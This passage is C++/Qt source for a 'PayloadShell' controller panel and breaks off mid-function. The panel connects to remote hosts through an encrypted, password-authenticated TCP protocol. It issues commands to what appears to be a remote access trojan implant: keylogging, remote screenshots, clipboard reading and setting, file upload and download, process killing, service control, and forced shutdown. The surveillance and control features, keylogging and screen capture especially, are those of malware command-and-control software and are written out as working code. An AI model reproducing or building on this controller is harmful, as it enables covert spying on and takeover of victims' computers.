void AppendConsoleOutput(const QString &Text) {
  {
    std::lock_guard<std::mutex> Lock(OutputMutex);
    ConsoleTranscript += Text;
  }
  QMetaObject::invokeMethod(
      qApp,
      [Text] {
        if (ConsoleOutputWidget) {
          ConsoleOutputWidget->moveCursor(QTextCursor::End);
          ConsoleOutputWidget->insertPlainText(Text);
          ConsoleOutputWidget->moveCursor(QTextCursor::End);
        }
      },
      Qt::QueuedConnection);
}

void AppendModuleOutput(const QString &Text) {
  {
    std::lock_guard<std::mutex> Lock(OutputMutex);
    ModuleTranscript += Text;
    ConsoleTranscript += Text;
  }
  QMetaObject::invokeMethod(
      qApp,
      [Text] {
        if (ConsoleOutputWidget) {
          ConsoleOutputWidget->moveCursor(QTextCursor::End);
          ConsoleOutputWidget->insertPlainText(Text);
          ConsoleOutputWidget->moveCursor(QTextCursor::End);
        }
        if (ModuleOutputWidget) {
          ModuleOutputWidget->moveCursor(QTextCursor::End);
          ModuleOutputWidget->insertPlainText(Text);
          ModuleOutputWidget->moveCursor(QTextCursor::End);
        }
      },
      Qt::QueuedConnection);
}

QString ConsoleOutputSnapshot() {
  std::lock_guard<std::mutex> Lock(OutputMutex);
  return ConsoleTranscript;
}

QString ModuleOutputSnapshot() {
  std::lock_guard<std::mutex> Lock(OutputMutex);
  return ModuleTranscript;
}

void ClearConsoleOutput() {
  {
    std::lock_guard<std::mutex> Lock(OutputMutex);
    ConsoleTranscript.clear();
  }
  if (ConsoleOutputWidget)
    ConsoleOutputWidget->clear();
}

void ClearModuleOutput() {
  {
    std::lock_guard<std::mutex> Lock(OutputMutex);
    ModuleTranscript.clear();
  }
  if (ModuleOutputWidget)
    ModuleOutputWidget->clear();
}

void ShowModuleOutputDialog(QWidget *Parent,
                            const QString &Title = "Module Output") {
  auto *Dialog =
      new QDialog(Parent ? Parent->window() : QApplication::activeWindow());
  Dialog->setAttribute(Qt::WA_DeleteOnClose);
  Dialog->resize(920, 640);
  Dialog->setWindowTitle(Title);
  auto *Layout = new QVBoxLayout(Dialog);
  Layout->setContentsMargins(16, 16, 16, 16);
  Layout->setSpacing(10);
  auto *Output = new PlainTextEdit;
  Output->setReadOnly(true);
  Output->setFont(QFont("Cascadia Mono", 10));
  Output->setPlainText(ModuleOutputSnapshot());
  InstallFluentScrollBar(Output, Qt::Vertical);
  InstallFluentScrollBar(Output, Qt::Horizontal);
  auto *ButtonRow = new QHBoxLayout;
  ButtonRow->setContentsMargins(0, 0, 0, 0);
  ButtonRow->setSpacing(8);
  auto *Clear = MakeButton("Clear");
  auto *Close = MakeButton("Close", true);
  ButtonRow->addStretch();
  ButtonRow->addWidget(Clear);
  ButtonRow->addWidget(Close);
  Layout->addWidget(Output, 1);
  Layout->addLayout(ButtonRow);
  if (Output)
    ModuleOutputWidget = Output;
  QObject::connect(Dialog, &QObject::destroyed, qApp, [Output] {
    if (ModuleOutputWidget == Output)
      ModuleOutputWidget = nullptr;
  });
  QObject::connect(Clear, &QPushButton::clicked, Dialog, [Dialog] {
    ClearModuleOutput();
    ShowSuccessNotice(Dialog, "Module Output", "Module output cleared.");
  });
  QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
  Dialog->show();
}

enum class PayloadShellReadState {
  Disconnected,
  AwaitChallenge,
  AwaitLength,
  AwaitPayload
};

struct PayloadShellState {
  QPointer<QWidget> Page;
  QPointer<QListWidget> HostList;
  QPointer<LineEdit> HostEdit;
  QPointer<LineEdit> PortEdit;
  QPointer<LineEdit> PasswordEdit;
  QPointer<PushButton> CommandButton;
  QPointer<PushButton> NewHostButton;
  QPointer<PushButton> SaveHostButton;
  QPointer<PushButton> RemoveHostButton;
  QPointer<PushButton> ConnectButton;
  QPointer<PushButton> DisconnectButton;
  std::map<qulonglong, std::shared_ptr<struct PayloadShellSession>> Sessions;
  qulonglong NextSessionId = 1;
};

constexpr int KPayloadShellRoleHost = Qt::UserRole + 1;
constexpr int KPayloadShellRolePort = Qt::UserRole + 2;
constexpr int KPayloadShellRolePassword = Qt::UserRole + 3;
constexpr int KPayloadShellRoleSessionId = Qt::UserRole + 4;

struct PayloadShellSession {
  qulonglong Id = 0;
  std::weak_ptr<PayloadShellState> State;
  QListWidgetItem *HostItem = nullptr;
  QString Host;
  QString Port;
  QString Password;
  QPointer<LineEdit> CommandEdit;
  QPointer<PushButton> SendButton;
  QPointer<PushButton> ScreenshotButton;
  QPointer<PushButton> UploadButton;
  QPointer<PushButton> DownloadButton;
  QPointer<QDialog> CommandDialog;
  QPointer<QTextEdit> OutputView;
  QPointer<QTcpSocket> Socket;
  QByteArray ReceiveBuffer;
  QByteArray SessionKey;
  QString PendingCommand;
  QString Transcript;
  QString Status = "Disconnected";
  QColor StatusColor = QColor("#8A94A6");
  int ExpectedPayloadLength = 0;
  bool Authenticating = false;
  bool DisconnectRequested = false;
  PayloadShellReadState ReadState = PayloadShellReadState::Disconnected;
};

std::shared_ptr<PayloadShellSession>
PayloadShellSessionForItem(const std::shared_ptr<PayloadShellState> &State,
                           QListWidgetItem *Item) {
  if (!State || !Item)
    return nullptr;
  const qulonglong Id = Item->data(KPayloadShellRoleSessionId).toULongLong();
  const auto It = State->Sessions.find(Id);
  return It == State->Sessions.end() ? nullptr : It->second;
}

std::shared_ptr<PayloadShellSession>
PayloadShellCurrentSession(const std::shared_ptr<PayloadShellState> &State) {
  return State && State->HostList
             ? PayloadShellSessionForItem(State, State->HostList->currentItem())
             : nullptr;
}

void PayloadShellRefreshHostItem(QListWidgetItem *Item, const QString &Status,
                                 const QColor &Color);

void PayloadShellRefreshSessionItem(
    const std::shared_ptr<PayloadShellSession> &Session) {
  if (!Session || !Session->HostItem)
    return;
  PayloadShellRefreshHostItem(Session->HostItem, Session->Status,
                              Session->StatusColor);
}

QString PayloadShellCurrentEndpoint(
    const std::shared_ptr<PayloadShellSession> &Session) {
  if (!Session)
    return "Shell";
  const QString Host =
      Session->Host.trimmed().isEmpty() ? "Shell" : Session->Host.trimmed();
  const QString Port = Session->Port.trimmed();
  if (Host.isEmpty())
    return "Shell";
  return Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port);
}

void PayloadShellUpdateCommandWindowTitle(
    const std::shared_ptr<PayloadShellSession> &Session) {
  if (!Session || !Session->CommandDialog)
    return;
  Session->CommandDialog->setWindowTitle(PayloadShellCurrentEndpoint(Session));
}

QString PayloadShellHostItemText(const QString &Host, const QString &Port,
                                 const QString &Status) {
  const QString Endpoint =
      Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port);
  return Status.isEmpty() ? Endpoint
                          : QString("%1  |  %2").arg(Endpoint, Status);
}

void PayloadShellRefreshHostItem(QListWidgetItem *Item, const QString &Status,
                                 const QColor &Color) {
  if (!Item)
    return;

  const QString Host = Item->data(KPayloadShellRoleHost).toString();
  const QString Port = Item->data(KPayloadShellRolePort).toString();
  Item->setText(PayloadShellHostItemText(Host, Port, Status));
  Item->setForeground(QBrush(Color));
  Item->setToolTip(Port.isEmpty() ? Host : QString("%1:%2").arg(Host, Port));
}

void PayloadShellRefreshHostList(
    const std::shared_ptr<PayloadShellState> &State) {
  if (!State || !State->HostList)
    return;

  for (int Index = 0; Index < State->HostList->count(); ++Index) {
    auto *Item = State->HostList->item(Index);
    std::shared_ptr<PayloadShellSession> Session =
        PayloadShellSessionForItem(State, Item);
    if (Session)
      PayloadShellRefreshHostItem(Item, Session->Status, Session->StatusColor);
    else
      PayloadShellRefreshHostItem(Item, QString(), PrimaryTextColor());
  }
  for (auto &[Id, Session] : State->Sessions)
    PayloadShellUpdateCommandWindowTitle(Session);
}

std::shared_ptr<PayloadShellSession>
PayloadShellCreateSession(const std::shared_ptr<PayloadShellState> &State,
                          QListWidgetItem *Item, const QString &Host,
                          const QString &Port, const QString &Password) {
  if (!State || !Item)
    return nullptr;

  auto Session = std::make_shared<PayloadShellSession>();
  Session->Id = State->NextSessionId++;
  Session->State = State;
  Session->HostItem = Item;
  Session->Host = Host.trimmed();
  Session->Port = Port.trimmed();
  Session->Password = Password;
  State->Sessions.emplace(Session->Id, Session);

  Item->setData(KPayloadShellRoleHost, Session->Host);
  Item->setData(KPayloadShellRolePort, Session->Port);
  Item->setData(KPayloadShellRolePassword, Session->Password);
  Item->setData(KPayloadShellRoleSessionId,
                static_cast<qulonglong>(Session->Id));
  PayloadShellRefreshSessionItem(Session);
  return Session;
}

QStringList PayloadShellCommandSuggestions() {
  return {"ls",          "cat",       "rm",        "mkdir",     "cp",
          "mv",          "ps",        "kill",      "sysinfo",   "drives",
          "netstat",     "wifi",      "services",  "svc_start", "svc_stop",
          "screenshot",  "wallpaper", "msgbox",    "lock",      "getclip",
          "setclip",     "shutdown",  "reboot",    "logoff",    "keylog start",
          "keylog stop", "cmd ",      "download ", "upload ",   "pwd"};
}

QByteArray PayloadShellSha256Hex(const QByteArray &Data) {
  return QCryptographicHash::hash(Data, QCryptographicHash::Sha256).toHex();
}

bool PayloadShellEncrypt(const QByteArray &Plaintext, const QByteArray &Key,
                         QByteArray *HexCipher, QString *Error) {
  if (Key.size() != 32) {
    if (Error)
      *Error = "Invalid session key length.";
    return false;
  }

  QByteArray Iv(16, '\0');
  if (RAND_bytes(reinterpret_cast<unsigned char *>(Iv.data()), Iv.size()) !=
      1) {
    if (Error)
      *Error = "Failed to generate IV.";
    return false;
  }

  EVP_CIPHER_CTX *Context = EVP_CIPHER_CTX_new();
  if (!Context) {
    if (Error)
      *Error = "Failed to create cipher context.";
    return false;
  }

  QByteArray Ciphertext(Plaintext.size() + EVP_MAX_BLOCK_LENGTH, 0);
  int UpdateLength = 0;
  int FinalLength = 0;
  const bool Success =
      EVP_EncryptInit_ex(
          Context, EVP_aes_256_cbc(), nullptr,
          reinterpret_cast<const unsigned char *>(Key.constData()),
          reinterpret_cast<const unsigned char *>(Iv.constData())) == 1 &&
      EVP_EncryptUpdate(
          Context, reinterpret_cast<unsigned char *>(Ciphertext.data()),
          &UpdateLength,
          reinterpret_cast<const unsigned char *>(Plaintext.constData()),
          Plaintext.size()) == 1 &&
      EVP_EncryptFinal_ex(Context,
                          reinterpret_cast<unsigned char *>(Ciphertext.data()) +
                              UpdateLength,
                          &FinalLength) == 1;
  EVP_CIPHER_CTX_free(Context);
  if (!Success) {
    if (Error)
      *Error = "AES encryption failed.";
    return false;
  }

  Ciphertext.truncate(UpdateLength + FinalLength);
  *HexCipher = (Iv + Ciphertext).toHex();
  return true;
}

bool PayloadShellDecrypt(const QByteArray &HexCipher, const QByteArray &Key,
                         QByteArray *Plaintext, QString *Error) {
  if (Key.size() != 32) {
    if (Error)
      *Error = "Invalid session key length.";
    return false;
  }

  const QByteArray Combined = QByteArray::fromHex(HexCipher.trimmed());
  if (Combined.size() <= 16) {
    if (Error)
      *Error = "Ciphertext is too short.";
    return false;
  }

  const QByteArray Iv = Combined.left(16);
  const QByteArray Ciphertext = Combined.mid(16);
  EVP_CIPHER_CTX *Context = EVP_CIPHER_CTX_new();
  if (!Context) {
    if (Error)
      *Error = "Failed to create decrypt context.";
    return false;
  }

  QByteArray Decrypted(Ciphertext.size() + EVP_MAX_BLOCK_LENGTH, 0);
  int UpdateLength = 0;
  int FinalLength = 0;
  const bool Success =
      EVP_DecryptInit_ex(
          Context, EVP_aes_256_cbc(), nullptr,
          reinterpret_cast<const unsigned char *>(Key.constData()),
          reinterpret_cast<const unsigned char *>(Iv.constData())) == 1 &&
      EVP_DecryptUpdate(
          Context, reinterpret_cast<unsigned char *>(Decrypted.data()),
          &UpdateLength,
          reinterpret_cast<const unsigned char *>(Ciphertext.constData()),
          Ciphertext.size()) == 1 &&
      EVP_DecryptFinal_ex(Context,
                          reinterpret_cast<unsigned char *>(Decrypted.data()) +
                              UpdateLength,
                          &FinalLength) == 1;
  EVP_CIPHER_CTX_free(Context);
  if (!Success) {
    if (Error)
      *Error = "AES decryption failed.";
    return false;
  }

  Decrypted.truncate(UpdateLength + FinalLength);
  *Plaintext = Decrypted;
  return true;
}

void PayloadShellLog(const std::shared_ptr<PayloadShellSession> &Session,
                     const QString &Message,
                     const QColor &Color = QColor("#7CFC00")) {
  if (!Session)
    return;

  Session->Transcript.append(Message);
  Session->Transcript.append('\n');
  if (!Session->OutputView)
    return;

  QTextCursor Cursor(Session->OutputView->document());
  Cursor.movePosition(QTextCursor::End);
  QTextCharFormat Format;
  Format.setForeground(Color);
  Cursor.insertText(Message + "\n", Format);
  Session->OutputView->setTextCursor(Cursor);
  Session->OutputView->ensureCursorVisible();
}

void PayloadShellSetStatus(const std::shared_ptr<PayloadShellSession> &Session,
                           const QString &Text, const QColor &Color) {
  if (!Session)
    return;

  Session->Status = Text;
  Session->StatusColor = Color;
  PayloadShellRefreshSessionItem(Session);
  PayloadShellUpdateCommandWindowTitle(Session);
}

void PayloadShellUpdateControls(
    const std::shared_ptr<PayloadShellState> &State) {
  if (!State)
    return;

  const std::shared_ptr<PayloadShellSession> Session =
      PayloadShellCurrentSession(State);
  const bool SocketConnected =
      Session && Session->Socket &&
      Session->Socket->state() == QAbstractSocket::ConnectedState;
  const bool Authenticated = Session && SocketConnected &&
                             !Session->SessionKey.isEmpty() &&
                             !Session->Authenticating;
  const bool Busy = Session && (Session->Authenticating ||
                                !Session->PendingCommand.isEmpty());
  const bool HasSelection = State->HostList && State->HostList->currentItem();

  if (State->ConnectButton)
    State->ConnectButton->setEnabled(!SocketConnected && HasSelection);
  if (State->CommandButton)
    State->CommandButton->setEnabled(HasSelection);
  if (State->DisconnectButton)
    State->DisconnectButton->setEnabled(SocketConnected);
  if (State->NewHostButton)
    State->NewHostButton->setEnabled(true);
  if (State->SaveHostButton)
    State->SaveHostButton->setEnabled(HasSelection && !SocketConnected);
  if (State->RemoveHostButton)
    State->RemoveHostButton->setEnabled(!SocketConnected && HasSelection &&
                                        State->HostList &&
                                        State->HostList->count() > 1);
  if (State->HostEdit)
    State->HostEdit->setEnabled(!SocketConnected);
  if (State->PortEdit)
    State->PortEdit->setEnabled(!SocketConnected);
  if (State->PasswordEdit)
    State->PasswordEdit->setEnabled(!SocketConnected);
  if (Session) {
    if (Session->SendButton)
      Session->SendButton->setEnabled(Authenticated && !Busy);
    if (Session->ScreenshotButton)
      Session->ScreenshotButton->setEnabled(Authenticated && !Busy);
    if (Session->UploadButton)
      Session->UploadButton->setEnabled(Authenticated && !Busy);
    if (Session->DownloadButton)
      Session->DownloadButton->setEnabled(Authenticated && !Busy);
    if (Session->CommandEdit)
      Session->CommandEdit->setPlaceholderText(
          Authenticated ? "Enter remote command"
                        : "Connect to the remote host first");
  }
}

void PayloadShellResetConnectionState(
    const std::shared_ptr<PayloadShellSession> &Session) {
  if (!Session)
    return;

  Session->ReceiveBuffer.clear();
  Session->SessionKey.clear();
  Session->PendingCommand.clear();
  Session->ExpectedPayloadLength = 0;
  Session->Authenticating = false;
  Session->DisconnectRequested = false;
  Session->ReadState = PayloadShellReadState::Disconnected;
}

void PayloadShellPersistConfiguration(
    const std::shared_ptr<PayloadShellState> &State) {
  if (!State)
    return;

  QJsonObject Object = ConfigurationSection("PayloadShell");
  QJsonArray Hosts;
  if (State->HostList) {
    for (int Index = 0; Index < State->HostList->count(); ++Index) {
      if (auto *Item = State->HostList->item(Index)) {
        const QString Host =
            Item->data(KPayloadShellRoleHost).toString().trimmed();
        const QString Port =
            Item->data(KPayloadShellRolePort).toString().trimmed();
        if (Host.isEmpty())
          continue;
        QJsonObject HostObject;
        HostObject.insert("Host", Host);
        HostObject.insert("Port", Port);
        Hosts.append(HostObject);
      }
    }
    Object.insert("Hosts", Hosts);
    Object.insert("SelectedHost", std::max(0, State->HostList->currentRow()));
    if (auto *Item = State->HostList->currentItem()) {
      Object.insert("Host", Item->data(KPayloadShellRoleHost).toString());
      Object.insert("Port", Item->data(KPayloadShellRolePort).toString());
    }
  } else {
    if (State->HostEdit)
      Object.insert("Host", State->HostEdit->text().trimmed());
    if (State->PortEdit)
      Object.insert("Port", State->PortEdit->text().trimmed());
  }
  Configuration.insert("PayloadShell", Object);
  SaveConfiguration();
}

bool PayloadShellWriteFrame(const std::shared_ptr<PayloadShellSession> &Session,
                            const QByteArray &Payload, QString *Error) {
  if (!Session || !Session->Socket ||
      Session->Socket->state() != QAbstractSocket::ConnectedState) {
    if (Error)
      *Error = "Socket is not connected.";
    return false;
  }

  QByteArray Frame(4, 0);
  const quint32 Length = static_cast<quint32>(Payload.size());
  Frame[0] = static_cast<char>((Length >> 24) & 0xFF);
  Frame[1] = static_cast<char>((Length >> 16) & 0xFF);
  Frame[2] = static_cast<char>((Length >> 8) & 0xFF);
  Frame[3] = static_cast<char>(Length & 0xFF);
  Frame.append(Payload);
  if (Session->Socket->write(Frame) < 0) {
    if (Error)
      *Error = Session->Socket->errorString();
    return false;
  }
  Session->Socket->flush();
  return true;
}

bool PayloadShellSendEncrypted(
    const std::shared_ptr<PayloadShellSession> &Session, const QString &Message,
    QString *Error) {
  QByteArray CipherHex;
  if (!PayloadShellEncrypt(Message.toUtf8(), Session->SessionKey, &CipherHex,
                           Error))
    return false;
  return PayloadShellWriteFrame(Session, CipherHex, Error);
}

void ShowPayloadShellCommandDialog(
    const std::shared_ptr<PayloadShellSession> &Session,
    const std::function<void(const QString &)> &SendShellCommand) {
  if (!Session)
    return;

  if (Session->CommandDialog) {
    PayloadShellUpdateCommandWindowTitle(Session);
    Session->CommandDialog->show();
    Session->CommandDialog->raise();
    Session->CommandDialog->activateWindow();
    if (Session->CommandEdit)
      Session->CommandEdit->setFocus();
    return;
  }

  const std::shared_ptr<PayloadShellState> State = Session->State.lock();
  auto *Dialog =
      new QDialog(State && State->Page ? State->Page->window()
                                       : QApplication::activeWindow());
  Dialog->setAttribute(Qt::WA_DeleteOnClose);
  Dialog->setModal(false);
  Dialog->setWindowModality(Qt::NonModal);
  Dialog->resize(980, 680);
  Session->CommandDialog = Dialog;
  PayloadShellUpdateCommandWindowTitle(Session);

  auto *Layout = new QVBoxLayout(Dialog);
  Layout->setContentsMargins(16, 16, 16, 16);
  Layout->setSpacing(12);

  auto *CommandCard = new SimpleCardWidget;
  CommandCard->setBorderRadius(5);
  auto *CommandLayout = new QHBoxLayout(CommandCard);
  CommandLayout->setContentsMargins(16, 16, 16, 16);
  CommandLayout->setSpacing(10);
  auto *CommandEdit = new LineEdit;
  CommandEdit->setClearButtonEnabled(true);
  CommandEdit->setPlaceholderText("Connect to the remote host first");
  auto *Completer =
      new QCompleter(PayloadShellCommandSuggestions(), CommandEdit);
  Completer->setCaseSensitivity(Qt::CaseInsensitive);
  Completer->setFilterMode(Qt::MatchContains);
  CommandEdit->setCompleter(Completer);
  auto *SendButton = MakeButton("Send", true);
  auto *ScreenshotButton = MakeButton("Screen");
  auto *UploadButton = MakeButton("Upload");
  auto *DownloadButton = MakeButton("Download");
  CommandLayout->addWidget(CommandEdit, 1);
  CommandLayout->addWidget(SendButton);
  CommandLayout->addWidget(ScreenshotButton);
  CommandLayout->addWidget(UploadButton);
  CommandLayout->addWidget(DownloadButton);
  Layout->addWidget(CommandCard);

  auto *OutputCard = new SimpleCardWidget;
  OutputCard->setBorderRadius(5);
  OutputCard->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
  auto *OutputLayout = new QVBoxLayout(OutputCard);
  OutputLayout->setContentsMargins(16, 16, 16, 16);
  OutputLayout->setSpacing(10);
  auto *OutputHeader = new QHBoxLayout;
  ConfigureToolbarLayout(OutputHeader);
  OutputHeader->addWidget(
      MakeLabel("Session Output", 13, KTextPrimary, QFont::DemiBold));
  OutputHeader->addStretch();
  auto *ClearOutput = MakeButton("Clear");
  OutputHeader->addWidget(ClearOutput);
  auto *ShellOutput = new QTextEdit;
  ShellOutput->setReadOnly(true);
  ShellOutput->setAcceptRichText(false);
  ShellOutput->setFont(QFont("Cascadia Mono", 10));
  ShellOutput->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Expanding);
  ShellOutput->setStyleSheet("QTextEdit { background: #000000; color: #7CFC00; "
                             "border: 1px solid rgba(255,255,255,0.08); }");
  ShellOutput->setPlainText(Session->Transcript);
  InstallFluentScrollBar(ShellOutput, Qt::Vertical);
  InstallFluentScrollBar(ShellOutput, Qt::Horizontal);
  OutputLayout->addLayout(OutputHeader);
  OutputLayout->addWidget(ShellOutput, 1);
  Layout->addWidget(OutputCard, 1);

  Session->CommandEdit = CommandEdit;
  Session->SendButton = SendButton;
  Session->ScreenshotButton = ScreenshotButton;
  Session->UploadButton = UploadButton;
  Session->DownloadButton = DownloadButton;
  Session->OutputView = ShellOutput;

  QObject::connect(ClearOutput, &QPushButton::clicked, Dialog, [Session] {
    Session->Transcript.clear();
    if (Session->OutputView)
      Session->OutputView->clear();
  });
  QObject::connect(SendButton, &QPushButton::clicked, Dialog,
                   [SendShellCommand] { SendShellCommand(QString()); });
  QObject::connect(CommandEdit, &QLineEdit::returnPressed, Dialog,
                   [SendShellCommand] { SendShellCommand(QString()); });
  QObject::connect(ScreenshotButton, &QPushButton::clicked, Dialog,
                   [SendShellCommand] { SendShellCommand("screenshot"); });
  QObject::connect(
      UploadButton, &QPushButton::clicked, Dialog, [Session, SendShellCommand] {
        if (Session->SessionKey.isEmpty()) {
          PayloadShellLog(Session, "Not connected!", QColor("#FF5F56"));
          return;
        }
        const QString Path = QFileDialog::getOpenFileName(
            Session->CommandDialog ? Session->CommandDialog->window() : nullptr,
            "Select file to upload", QString(), "All files (*.*)");
        if (Path.isEmpty())
          return;
        QFile File(Path);
        if (!File.open(QIODevice::ReadOnly)) {
          PayloadShellLog(Session, "Upload error: failed to read file.",
                          QColor("#FF5F56"));
          return;
        }
        const QByteArray Data = File.readAll();
        const QString Command = QString("upload %1 %2")
                                    .arg(QFileInfo(Path).fileName(),
                                         QString::fromLatin1(Data.toBase64()));
        if (Session->CommandEdit)
          Session->CommandEdit->setText(Command);
        SendShellCommand(Command);
      });
  QObject::connect(DownloadButton, &QPushButton::clicked, Dialog, [Session] {
    if (Session->CommandEdit) {
      Session->CommandEdit->setText("download ");
      Session->CommandEdit->setFocus();
      Session->CommandEdit->setCursorPosition(
          Session->CommandEdit->text().size());
    }
  });
  QObject::connect(Dialog, &QObject::destroyed, qApp,
                   [Session, CommandEdit, SendButton, ScreenshotButton,
                    UploadButton, DownloadButton, ShellOutput] {
                     if (Session->CommandEdit == CommandEdit)
                       Session->CommandEdit = nullptr;
                     if (Session->SendButton == SendButton)
                       Session->SendButton = nullptr;
                     if (Session->ScreenshotButton == ScreenshotButton)
                       Session->ScreenshotButton = nullptr;
                     if (Session->UploadButton == UploadButton)
                       Session->UploadButton = nullptr;
                     if (Session->DownloadButton == DownloadButton)
                       Session->DownloadButton = nullptr;
                     if (Session->OutputView == ShellOutput)
                       Session->OutputView = nullptr;
                     Session->CommandDialog = nullptr;
                   });

  PayloadShellUpdateControls(State);
  Dialog->show();
  Dialog->raise();
  Dialog->activateWindow();
  CommandEdit->setFocus();
}

void PayloadShellShowScreenshot(
    const std::shared_ptr<PayloadShellSession> &Session,
    const QByteArray &PngBytes) {
  QPixmap Pixmap;
  if (!Pixmap.loadFromData(PngBytes)) {
    PayloadShellLog(Session, "Failed to decode screenshot.", QColor("#FF5F56"));
    return;
  }

  const std::shared_ptr<PayloadShellState> State =
      Session ? Session->State.lock() : nullptr;
  auto *Dialog =
      new QDialog(State && State->Page ? State->Page->window()
                                       : QApplication::activeWindow());
  Dialog->setAttribute(Qt::WA_DeleteOnClose);
  Dialog->setWindowTitle("Remote Screenshot");
  Dialog->resize(900, 640);
  auto *Layout = new QVBoxLayout(Dialog);
  Layout->setContentsMargins(16, 16, 16, 16);
  Layout->setSpacing(10);
  auto *Image = new QLabel;
  Image->setAlignment(Qt::AlignCenter);
  Image->setScaledContents(true);
  Image->setPixmap(Pixmap);
  Image->setMinimumSize(640, 420);
  auto *Buttons = new QHBoxLayout;
  Buttons->setContentsMargins(0, 0, 0, 0);
  Buttons->setSpacing(8);
  auto *Save = MakeButton("Save As...");
  auto *Close = MakeButton("Close", true);
  Buttons->addStretch();
  Buttons->addWidget(Save);
  Buttons->addWidget(Close);
  Layout->addWidget(Image, 1);
  Layout->addLayout(Buttons);
  QObject::connect(Save, &QPushButton::clicked, Dialog, [Dialog, PngBytes] {
    const QString Path = QFileDialog::getSaveFileName(
        Dialog, "Save screenshot", "screenshot.png", "PNG Image (*.png)");
    if (Path.isEmpty())
      return;
    QFile File(Path);
    if (File.open(QIODevice::WriteOnly))
      File.write(PngBytes);
  });
  QObject::connect(Close, &QPushButton::clicked, Dialog, &QDialog::accept);
  Dialog->show();
}

void PayloadShellHandleResponse(
    const std::shared_ptr<PayloadShellSession> &Session, const QString &Command,
    const QString &Response) {
  const QString NormalizedCommand = Command.trimmed().toLower();
  if (Response.startsWith("ERR:")) {
    PayloadShellLog(Session, Response, QColor("#FF5F56"));
    return;
  }

  if (NormalizedCommand == "screenshot" ||
      NormalizedCommand.startsWith("download ")) {
    const QString Data = Response.startsWith("OK\n") ? Response.mid(3).trimmed()
                                                     : Response.trimmed();
    if (NormalizedCommand == "screenshot") {
      const QByteArray ImageBytes = QByteArray::fromHex(Data.toLatin1());
      if (ImageBytes.isEmpty()) {
        PayloadShellLog(Session, "Failed to decode screenshot payload.",
                        QColor("#FF5F56"));
        return;
      }
      PayloadShellShowScreenshot(Session, ImageBytes);
      PayloadShellLog(
          Session,
          QString("Screenshot received (%1 bytes)").arg(ImageBytes.size()),
          QColor("#27C93F"));
      return;
    }

    const QByteArray FileBytes = QByteArray::fromBase64(Data.toLatin1());
    if (FileBytes.isEmpty() && !Data.isEmpty()) {
      PayloadShellLog(Session, "ERR: failed to decode file data",
                      QColor("#FF5F56"));
      return;
    }

    QString FileName = QFileInfo(NormalizedCommand.mid(9).trimmed()).fileName();
    if (FileName.isEmpty())
      FileName = "download.bin";
    const std::shared_ptr<PayloadShellState> State =
        Session ? Session->State.lock() : nullptr;
    const QString Path = QFileDialog::getSaveFileName(
        State && State->Page ? State->Page->window() : nullptr,
        "Save downloaded file", FileName, "All files (*.*)");
    if (Path.isEmpty())
      return;

    QFile File(Path);
    if (!File.open(QIODevice::WriteOnly)) {
      PayloadShellLog(Session, "ERR: failed to save downloaded file",
                      QColor("#FF5F56"));
      return;
    }
    File.write(FileBytes);
    PayloadShellLog(Session,
                    QString("Saved to: %1 (%2 bytes)")
                        .arg(QDir::toNativeSeparators(Path))
                        .arg(FileBytes.size()),
                    QColor("#27C93F"));
    return;
  }

  const QString Text = Response.startsWith("OK\n") ? Response.mid(3) : Response;
  PayloadShellLog(Session, Text, QColor("#7CFC00"));
}

void PayloadShellProcessBuffer(
    const std::shared_ptr<PayloadShellState> &State,
    const std::shared_ptr<PayloadShellSession> &Session) {
  if (!State || !Session)
    return;

  while (true) {
    if (Session->ReadState == PayloadShellReadState::AwaitChallenge) {
      const int NewLineIndex = Session->ReceiveBuffer.indexOf('\n');
      if (NewLineIndex < 0)
        return;

      const QByteArray Message =
          Session->ReceiveBuffer.left(NewLineIndex).trimmed();
      Session->ReceiveBuffer.remove(0, NewLineIndex + 1);
      if (!Message.startsWith("CHALLENGE:") || Message.size() < 74) {
        PayloadShellLog(Session, "Error: invalid handshake", QColor("#FF5F56"));
        PayloadShellSetStatus(Session, "Handshake failed", QColor("#FF5F56"));
        if (Session->Socket)
          Session->Socket->disconnectFromHost();
        return;
      }

      const QByteArray Challenge = Message.mid(10);
      const QByteArray PasswordHash =
          PayloadShellSha256Hex(Session->Password.toUtf8());
      const QByteArray SessionKeyHex =
          PayloadShellSha256Hex(PasswordHash + Challenge);
      Session->SessionKey = QByteArray::fromHex(SessionKeyHex);
      PayloadShellLog(Session,
                      "Challenge received: " + QString::fromLatin1(Challenge),
                      QColor("#4FC3F7"));
      PayloadShellLog(Session,
                      "PasswordHash: " + QString::fromLatin1(PasswordHash),
                      QColor("#4FC3F7"));
      PayloadShellLog(Session,
                      "SessionKey: " + QString::fromLatin1(SessionKeyHex),
                      QColor("#4FC3F7"));

      QString Error;
      if (!PayloadShellSendEncrypted(
              Session, "AUTH:" + QString::fromLatin1(PasswordHash), &Error)) {
        PayloadShellLog(Session, "Auth send failed: " + Error,
                        QColor("#FF5F56"));
        PayloadShellSetStatus(Session, "Auth send failed", QColor("#FF5F56"));
        if (Session->Socket)
          Session->Socket->disconnectFromHost();
        return;
      }

      Session->Authenticating = true;
      Session->ReadState = PayloadShellReadState::AwaitLength;
      PayloadShellUpdateControls(State);
      continue;
    }

    if (Session->ReadState == PayloadShellReadState::AwaitLength) {
      if (Session->ReceiveBuffer.size() < 4)
        return;

      const quint32 Length =
          (static_cast<unsigned char>(Session->ReceiveBuffer[0]) << 24) |
          (static_cast<unsigned char>(Session->ReceiveBuffer[1]) << 16) |
          (static_cast<unsigned char>(Session->ReceiveBuffer[2]) << 8) |
          static_cast<unsigned char>(Session->ReceiveBuffer[3]);
      Session->ReceiveBuffer.remove(0, 4);
      if (Length == 0 || Length > 100u * 1024u * 1024u) {
        PayloadShellLog(Session, "Receive failed: invalid packet length.",
                        QColor("#FF5F56"));
        if (Session->Socket)
          Session->Socket->disconnectFromHost();
        return;
      }
      Session->ExpectedPayloadLength = static_cast<int>(Length);
      Session->ReadState = PayloadShellReadState::AwaitPayload;
      continue;
    }

    if (Session->ReadState == PayloadShellReadState::AwaitPayload) {
      if (Session->ReceiveBuffer.size() < Session->ExpectedPayloadLength)
        return;

      const QByteArray Packet =
          Session->ReceiveBuffer.left(Session->ExpectedPayloadLength);
      Session->ReceiveBuffer.remove(0, Session->ExpectedPayloadLength);
      Session->ExpectedPayloadLength = 0;
      Session->ReadState = PayloadShellReadState::AwaitLength;

      QByteArray Plaintext;
      QString Error;
